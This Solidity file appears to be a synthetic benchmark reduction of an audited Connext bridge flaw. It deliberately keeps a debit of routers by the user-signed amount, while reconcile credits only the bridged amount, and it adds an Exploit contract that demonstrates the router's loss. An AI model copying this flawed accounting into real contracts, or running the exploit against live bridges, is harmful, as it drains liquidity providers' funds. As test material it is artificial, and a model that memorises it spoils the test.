// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Connext — execute() routers pay signed amount; reconcile credits bridgedAmt
    (Code4rena 2022-06-connext, finding #25133, H-04)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: xcall swaps adopted→local with slippage, bridges bridgedAmt, but
    execute/_handleExecuteLiquidity debits routers by the user-signed amount.
    Reconcile credits only action.amnt() (= bridgedAmt). Routers lose the gap.
    Vulnerable debit of _args.amount preserved (@> VULN). */

/// @dev Minimal local asset (bridged representation).
contract MockToken {
    string public symbol = "LOCAL";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function burn(address from, uint256 amt) external {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

struct ExecuteArgs {
    uint256 amount; // user-signed amount (pre-slippage)
    address local;
    address[] routers;
    address recipient;
}

/// @notice Reduced BridgeFacet: xcall slip → execute debit routers by signed amount
///         → reconcile credits bridgedAmt only.
contract BridgeFacet {
    mapping(address => mapping(address => uint256)) public routerBalances; // router => token => bal
    mapping(bytes32 => address[]) public routedTransfers;
    mapping(bytes32 => bool) public reconciledTransfers;
    mapping(bytes32 => uint256) public bridgedAmount; // what nomad message carries

    uint256 public constant LIQ_FEE_NUM = 9995;
    uint256 public constant LIQ_FEE_DEN = 10000;

    /// @dev Origin-side: user "signs" amountIn; swap slippage yields bridgedAmt < amountIn.
    function xcall(bytes32 transferId, address local, uint256 amountIn, uint256 bridgedAmt) external {
        // Model swapToLocalAssetIfNeeded producing bridgedAmt (message amount).
        require(bridgedAmt <= amountIn, "bridge <= signed");
        bridgedAmount[transferId] = bridgedAmt;
        // Canonical escrow / mint on remote omitted — destination reconcile mints bridgedAmt.
    }

    /// @dev Destination fast path: routers front liquidity based on ExecuteArgs.amount.
    function execute(bytes32 transferId, ExecuteArgs calldata args) external {
        _handleExecuteLiquidity(transferId, true, args);
        // deliver to recipient (fee-adjusted) — omitted for focus on router debit
        args.recipient;
    }

    function _handleExecuteLiquidity(
        bytes32 _transferId,
        bool _isFast,
        ExecuteArgs calldata _args
    ) private returns (uint256, address) {
        uint256 toSwap = _args.amount;

        if (_isFast) {
            uint256 pathLen = _args.routers.length;

            // Calculate amount that routers will provide with the fast-liquidity fee deducted.
            toSwap = _getFastTransferAmount(_args.amount, LIQ_FEE_NUM, LIQ_FEE_DEN);

            // Save the addresses of all routers providing liquidity for this transfer.
            routedTransfers[_transferId] = _args.routers;

            {
                // for each router, assert they are approved, and deduct liquidity
                uint256 routerAmount = toSwap / pathLen;
                for (uint256 i; i < pathLen; ) {
                    // decrement routers liquidity — FIX: debit using bridgedAmt (message amount), not signed amount
                    routerBalances[_args.routers[i]][_args.local] -= routerAmount; // @> VULN: debit uses _args.amount (signed), not bridgedAmt

                    unchecked {
                        i++;
                    }
                }
            }
        }
        return (toSwap, _args.local);
    }

    function _getFastTransferAmount(uint256 amount, uint256 num, uint256 den) internal pure returns (uint256) {
        return (amount * num) / den;
    }

    /// @dev Message handler: credit routers the bridged amount only.
    function reconcile(bytes32 transferId, address token) external {
        require(!reconciledTransfers[transferId], "already");
        uint256 amount = bridgedAmount[transferId]; // action.amnt() from nomad message
        reconciledTransfers[transferId] = true;

        address[] memory routers = routedTransfers[transferId];
        uint256 pathLen = routers.length;
        if (pathLen != 0) {
            uint256 routerAmt = amount / pathLen;
            for (uint256 i; i < pathLen; ) {
                routerBalances[routers[i]][token] += routerAmt;
                unchecked {
                    i++;
                }
            }
        }
        // Mint/escrow of `amount` into the bridge is implicit for balance math:
        // routers were debited in execute and credited here — net = credit - debit.
        token;
    }

    function creditRouter(address router, address token, uint256 amt) external {
        routerBalances[router][token] += amt;
    }
}

contract Exploit {
    MockToken public local; // CREATE nonce 1
    BridgeFacet public bridge; // CREATE nonce 2 — vulnerable
    address public router; // CREATE nonce 3

    uint256 public constant SIGNED = 100 ether;
    uint256 public constant BRIDGED = 90 ether; // 10% swap slippage on origin
    uint256 public constant ROUTER_SEED = 200 ether;

    constructor() {
        local = new MockToken();
        bridge = new BridgeFacet();
        router = address(new RouterWallet());

        // Router has liquidity booked in the bridge accounting.
        bridge.creditRouter(router, address(local), ROUTER_SEED);
    }

    function run() external {
        bytes32 transferId = keccak256("xfer-1");

        // Origin: user signed 100, swap yielded 90 bridged.
        bridge.xcall(transferId, address(local), SIGNED, BRIDGED);

        address[] memory routers = new address[](1);
        routers[0] = router;

        ExecuteArgs memory args = ExecuteArgs({
            amount: SIGNED, // user-signed — what execute uses
            local: address(local),
            routers: routers,
            recipient: address(this)
        });

        uint256 balBefore = bridge.routerBalances(router, address(local));

        // Fast path: routers pay based on SIGNED (minus liq fee).
        bridge.execute(transferId, args);

        uint256 afterExecute = bridge.routerBalances(router, address(local));
        uint256 expectedDebit = (SIGNED * bridge.LIQ_FEE_NUM()) / bridge.LIQ_FEE_DEN();
        require(balBefore - afterExecute == expectedDebit, "debited signed-based amount");

        // Reconcile credits only BRIDGED.
        bridge.reconcile(transferId, address(local));
        uint256 afterReconcile = bridge.routerBalances(router, address(local));
        require(afterReconcile - afterExecute == BRIDGED, "credited bridged only");

        // HARM: router net loss ≈ expectedDebit - BRIDGED (> 0 because signed > bridged).
        // With fee: debit = 99.95e18, credit = 90e18 → loss ≈ 9.95e18
        uint256 net = afterReconcile;
        require(net < balBefore, "router lost funds");
        uint256 loss = balBefore - net;
        require(loss == expectedDebit - BRIDGED, "loss = signedFast - bridged");
        require(loss > 9 ether, "material router loss from slippage gap");
    }
}

contract RouterWallet {
    // identity stand-in for a liquidity router
}
